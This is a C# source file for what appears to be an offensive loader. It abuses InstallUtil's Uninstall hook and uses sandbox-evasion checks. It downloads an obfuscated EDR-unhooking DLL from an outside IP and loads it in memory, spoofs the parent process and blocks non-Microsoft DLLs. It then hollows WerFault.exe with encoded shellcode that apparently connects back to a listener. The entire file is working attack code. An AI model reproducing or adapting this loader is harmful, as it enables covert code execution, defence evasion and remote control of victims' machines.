using System;
using System.Net;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Reflection;

namespace UnhookerBypPPIDandBlockDLL
{
    class Program
    {
        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr FlsAlloc(IntPtr callback);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        static void Main(string[] args)
        {
            Console.WriteLine("[+] alright then");
        }
    }
    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        internal struct STARTUPINFO
        {
            public Int32 cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct STARTUPINFOEX
        {
            public STARTUPINFO StartupInfo;
            public IntPtr lpAttributeList;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr lpSecurityDescriptor;
            public int bInheritHandle;
        }

        [Flags]
        public enum ProcThreadAttribute : int
        {
            MITIGATION_POLICY = 0x20007,
            PARENT_PROCESS = 0x00020000
        }

        [Flags]
        public enum BinarySignaturePolicy : ulong
        {
            BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x100000000000,
            BLOCK_NON_MICROSOFT_BINARIES_ALLOW_STORE = 0x300000000000
        }

        [Flags]
        public enum CreationFlags : uint
        {
            CreateSuspended = 0x00000004,
            DetachedProcess = 0x00000008,
            CreateNoWindow = 0x08000000,
            ExtendedStartupInfoPresent = 0x00080000
        }

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr FlsAlloc(IntPtr callback);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll")]
        static extern int GetProcessId(IntPtr handle);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool DeleteProcThreadAttributeList(IntPtr lpAttributeList);

        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            // check to see if 10 seconds elapsed (exit if not)
            Console.WriteLine("[+] Initiating sleeper");
            DateTime stime = DateTime.Now;
            Sleep(10000);
            double etime = DateTime.Now.Subtract(stime).TotalSeconds;
            if (etime < 10)
            {
                return;
            }

            // first non-emulated win32 API
            Console.WriteLine("[+] Initiating non-emulated API bypass");
            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }

            // non-emulated win32 api 
            Console.WriteLine("[+] Initiating non-emulated API bypass again");
            IntPtr call = FlsAlloc(IntPtr.Zero);
            if (call == null)
            {
                return;
            }

            WebClient wc = new WebClient();
            Console.WriteLine("[+] Loading unhooker into memory");
            byte[] suDllDat = wc.DownloadData("htt" + "p://192." + "168.223" + ".12" + "9/unh" + "ook" + "er.d" + "ll");

            Assembly remoteAssembly = Assembly.Load(suDllDat);
            Console.WriteLine("[+] Unhooker Loaded into memory");

            var UnhookClass = remoteAssembly.GetType("Sh" + "ar" + "pU" + "nh" + "oo" + "ker");
            Console.WriteLine("[+] Got Type");
            var CreaeteDLLinstance = Activator.CreateInstance(UnhookClass, null);

            var UnhookMethod = UnhookClass.GetMethod("Main", BindingFlags.Static | BindingFlags.Public);
            Console.WriteLine("[+] Got Method");
            Console.WriteLine("[+] Executing unhook");
            UnhookMethod.Invoke(null, new object[] { });


            Console.WriteLine("[+] Checking filename");
            String fileName = Process.GetCurrentProcess().MainModule.FileName;
            Console.WriteLine("[+]" + fileName);
            if (fileName != "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe")
            {
                return;
            }


            //Initializing process hollowing
            //defining necessary objects
            STARTUPINFOEX si = new STARTUPINFOEX();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
            si.StartupInfo.cb = (Int32)Marshal.SizeOf(si);

            SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
            SECURITY_ATTRIBUTES tSec = new SECURITY_ATTRIBUTES();
            pSec.nLength = Marshal.SizeOf(pSec);
            tSec.nLength = Marshal.SizeOf(tSec);

            //variables for PPID spoofing
            IntPtr attribVal = Marshal.AllocHGlobal(IntPtr.Size);
            IntPtr attribSz = IntPtr.Zero;
            string newParentProcName = "explorer";
            string newChildProcPath = "C:\\Windows\\System32\\WerFault.exe";


            //variables for ReadProcessMemory
            IntPtr nRead = IntPtr.Zero;
            byte[] addrBuf = new byte[IntPtr.Size];
            byte[] data = new byte[0x200];

            try
            {

                // get the attribSz of the InitializeProcThreadAttributeList struct
                InitializeProcThreadAttributeList(IntPtr.Zero, 2, 0, ref attribSz);

                // need to allocate enough space for the attribute struct
                si.lpAttributeList = Marshal.AllocHGlobal(attribSz);

                // Now we'll initialize one for real
                InitializeProcThreadAttributeList(si.lpAttributeList, 2, 0, ref attribSz);

                // need to set the BinarySignaturePolicy
                Marshal.WriteIntPtr(attribVal, new IntPtr((long)BinarySignaturePolicy.BLOCK_NON_MICROSOFT_BINARIES_ALLOW_STORE));

                // PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALLOW_STORE (0x00000003ui64 << 44) 
                UpdateProcThreadAttribute(si.lpAttributeList, 0, (IntPtr)ProcThreadAttribute.MITIGATION_POLICY, attribVal, attribSz, IntPtr.Zero, IntPtr.Zero);

                // Get the ppid into attribVal so can update the ProcThreadAttribute PARENT_PROCESS
                IntPtr hNewParent = new IntPtr();

                // try first as newParentProcname points to a specific PID, else by first returned PID by process name
                Int32 parsedprocid = 0;
                if (Int32.TryParse(newParentProcName, out parsedprocid))
                {
                    hNewParent = Process.GetProcessById(parsedprocid).Handle;
                }
                else
                {
                    hNewParent = Process.GetProcessesByName(newParentProcName)[0].Handle;
                }

                attribVal = Marshal.AllocHGlobal(IntPtr.Size);
                Marshal.WriteIntPtr(attribVal, hNewParent);

                // Spoof the parent process 
                UpdateProcThreadAttribute(si.lpAttributeList, 0, (IntPtr)ProcThreadAttribute.PARENT_PROCESS, attribVal, attribSz, IntPtr.Zero, IntPtr.Zero);


                //Start the new process with PPID spoofing
                Console.WriteLine("[+] Starting new target process");
                CreateProcess(null, newChildProcPath, ref pSec, ref tSec, false, (uint)(CreationFlags.CreateSuspended | CreationFlags.ExtendedStartupInfoPresent), IntPtr.Zero, null, ref si, out pi);

                Console.WriteLine("[+] Gathering process information");
                uint tmp = 0;
                IntPtr hProcess = pi.hProcess;
                ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);

                IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);

                Console.WriteLine("[+] Reading process memory");
                ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);

                IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));
                ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);

                uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);

                uint opthdr = e_lfanew_offset + 0x28;

                uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);

                Console.WriteLine("[+] Entry point found!");
                IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);

                // insert encoded shellcode here
                byte[] buf = new byte[613] { 0xda, 0x8e, 0xd9, 0xf2, 0xe6, 0xee, 0x0a, 0x56, 0x56, 0x56, 0x97, 0x87, 0x97, 0x86, 0x88, 0x8e, 0x27, 0x08, 0x73, 0x8e, 0xd1, 0x88, 0x76, 0x8e, 0xd1, 0x88, 0x3e, 0x87, 0x84, 0x8e, 0xd1, 0x88, 0x36, 0x8e, 0x4d, 0xa5, 0x90, 0x90, 0x8b, 0x27, 0x0f, 0x8e, 0xd1, 0x68, 0x86, 0x8e, 0x27, 0x16, 0xaa, 0x1a, 0x77, 0x5a, 0x58, 0x2a, 0x36, 0x97, 0x17, 0x0f, 0x4b, 0x97, 0x57, 0x17, 0xf8, 0xeb, 0x88, 0x8e, 0xd1, 0x88, 0x36, 0xd1, 0x98, 0x1a, 0x8e, 0x57, 0x06, 0x97, 0x87, 0x74, 0xd7, 0x5e, 0x3e, 0x51, 0x58, 0x4d, 0xd3, 0x68, 0x56, 0x56, 0x56, 0xd1, 0xd6, 0xce, 0x56, 0x56, 0x56, 0x8e, 0xd3, 0x16, 0x62, 0x75, 0x8e, 0x57, 0x06, 0x92, 0xd1, 0x96, 0x36, 0xd1, 0x8e, 0x3e, 0x86, 0x8f, 0x57, 0x06, 0xf9, 0x84, 0x8e, 0xdd, 0x0f, 0x8b, 0x27, 0x0f, 0x97, 0xd1, 0x22, 0xce, 0x8e, 0x57, 0x04, 0x8e, 0x27, 0x16, 0x97, 0x17, 0x0f, 0x4b, 0xaa, 0x97, 0x57, 0x17, 0x1e, 0xf6, 0x63, 0xe7, 0x8a, 0x59, 0x8a, 0x32, 0x4e, 0x93, 0x1f, 0x07, 0x63, 0xfe, 0x7e, 0x92, 0xd1, 0x96, 0x32, 0x8f, 0x57, 0x06, 0x74, 0x97, 0xd1, 0x4a, 0x8e, 0x92, 0xd1, 0x96, 0x3a, 0x8f, 0x57, 0x06, 0x97, 0xd1, 0x52, 0xce, 0x8e, 0x57, 0x06, 0x97, 0x7e, 0x97, 0x7e, 0x7c, 0x7f, 0x80, 0x97, 0x7e, 0x97, 0x7f, 0x97, 0x80, 0x8e, 0xd9, 0xea, 0x36, 0x97, 0x88, 0xdd, 0xf6, 0x7e, 0x97, 0x7f, 0x80, 0x8e, 0xd1, 0x48, 0xef, 0x91, 0xdd, 0xdd, 0xdd, 0x7b, 0x8e, 0x27, 0x01, 0x89, 0x8f, 0x9c, 0x65, 0x6f, 0x6c, 0x6f, 0x6c, 0x73, 0x62, 0x56, 0x97, 0x84, 0x8e, 0xcf, 0xf7, 0x8f, 0x15, 0x18, 0x8a, 0x65, 0x34, 0x55, 0xdd, 0x03, 0x89, 0x89, 0x8e, 0xcf, 0xf7, 0x89, 0x80, 0x8b, 0x27, 0x16, 0x8b, 0x27, 0x0f, 0x89, 0x89, 0x8f, 0xa0, 0x20, 0x84, 0x5f, 0xb5, 0x56, 0x56, 0x56, 0x56, 0xdd, 0x03, 0xee, 0x46, 0x56, 0x56, 0x56, 0x27, 0x1f, 0x28, 0x2c, 0x27, 0x24, 0x1e, 0x2c, 0x28, 0x28, 0x29, 0x2c, 0x27, 0x28, 0x1f, 0x56, 0x80, 0x8e, 0xcf, 0x17, 0x8f, 0x15, 0x16, 0xa1, 0x57, 0x56, 0x56, 0x8b, 0x27, 0x0f, 0x89, 0x89, 0x70, 0x59, 0x89, 0x8f, 0xa0, 0x85, 0xcf, 0xbd, 0x14, 0x56, 0x56, 0x56, 0x56, 0xdd, 0x03, 0xee, 0x1f, 0x56, 0x56, 0x56, 0x2d, 0x6e, 0x82, 0x26, 0x8e, 0x85, 0x91, 0x29, 0x26, 0x89, 0x88, 0x27, 0x7f, 0x6f, 0x84, 0x6b, 0x8a, 0x8d, 0x27, 0x85, 0x7f, 0x85, 0x75, 0x89, 0x63, 0x6d, 0x84, 0x97, 0x6b, 0x8b, 0x27, 0x6d, 0x5e, 0x6f, 0x8c, 0x26, 0x87, 0x72, 0x65, 0x6a, 0x2b, 0x74, 0x8b, 0x70, 0x6d, 0x8a, 0x80, 0x63, 0x82, 0x8d, 0x89, 0x8a, 0x85, 0x91, 0x66, 0x95, 0x56, 0x8e, 0xcf, 0x17, 0x89, 0x80, 0x97, 0x7e, 0x8b, 0x27, 0x0f, 0x89, 0x8e, 0x9e, 0x56, 0x28, 0xae, 0xd2, 0x56, 0x56, 0x56, 0x56, 0x86, 0x89, 0x89, 0x8f, 0x15, 0x18, 0xf1, 0x83, 0x2c, 0x21, 0xdd, 0x03, 0x8e, 0xcf, 0x14, 0x70, 0x50, 0x7d, 0x8e, 0xcf, 0xe7, 0x70, 0x3d, 0x80, 0x88, 0x6e, 0xd6, 0x29, 0x56, 0x56, 0x8f, 0xcf, 0xf6, 0x70, 0x52, 0x97, 0x7f, 0x8f, 0xa0, 0x63, 0x94, 0xbc, 0xd4, 0x56, 0x56, 0x56, 0x56, 0xdd, 0x03, 0x8b, 0x27, 0x16, 0x89, 0x80, 0x8e, 0xcf, 0xe7, 0x8b, 0x27, 0x0f, 0x8b, 0x27, 0x0f, 0x89, 0x89, 0x8f, 0x15, 0x18, 0x2b, 0x54, 0x3e, 0x61, 0xdd, 0x03, 0xd3, 0x16, 0x63, 0x3d, 0x8e, 0x15, 0x17, 0xce, 0x49, 0x56, 0x56, 0x8f, 0xa0, 0x92, 0xe6, 0x23, 0xf6, 0x56, 0x56, 0x56, 0x56, 0xdd, 0x03, 0x8e, 0xdd, 0x0d, 0x62, 0x58, 0xf1, 0xb0, 0xee, 0x83, 0x56, 0x56, 0x56, 0x89, 0x7f, 0x70, 0x96, 0x80, 0x8f, 0xcf, 0x07, 0x17, 0xf8, 0x46, 0x8f, 0x15, 0x16, 0x56, 0x46, 0x56, 0x56, 0x8f, 0xa0, 0x7e, 0xb2, 0x89, 0xf3, 0x56, 0x56, 0x56, 0x56, 0xdd, 0x03, 0x8e, 0xc9, 0x89, 0x89, 0x8e, 0xcf, 0xf5, 0x8e, 0xcf, 0xe7, 0x8e, 0xcf, 0x00, 0x8f, 0x15, 0x16, 0x56, 0x36, 0x56, 0x56, 0x8f, 0xcf, 0xdf, 0x8f, 0xa0, 0x48, 0xc4, 0xcf, 0xf8, 0x56, 0x56, 0x56, 0x56, 0xdd, 0x03, 0x8e, 0xd9, 0x12, 0x36, 0xd3, 0x16, 0x62, 0xa8, 0x74, 0xd1, 0x55, 0x8e, 0x57, 0x19, 0xd3, 0x16, 0x63, 0x08, 0x7e, 0x19, 0x7e, 0x70, 0x56, 0x7f, 0xa1, 0xf6, 0x3b, 0x30, 0x50, 0x97, 0xcf, 0x00, 0xdd, 0x03 };

                // xor decode with key value 0x3c
                Console.WriteLine("[+] Decrypting shellcode");
                for (int i = 0; i < buf.Length; i++)
                {
                    buf[i] = (byte)((((uint)buf[i] - 26) ^ 0x3c) & 0xFF);
                }

                Console.WriteLine("[+] Writing process memory");
                WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);

                Console.WriteLine("[+] Resuming process thread");
                ResumeThread(pi.hThread);

                Console.WriteLine("[+] Check your listener");
            }
            catch (Exception e)
            {
                Console.WriteLine(e.StackTrace);
            }
            finally
            {
                DeleteProcThreadAttributeList(si.lpAttributeList);
                Marshal.FreeHGlobal(si.lpAttributeList);
                Marshal.FreeHGlobal(attribVal);
            }
        }
    }
}
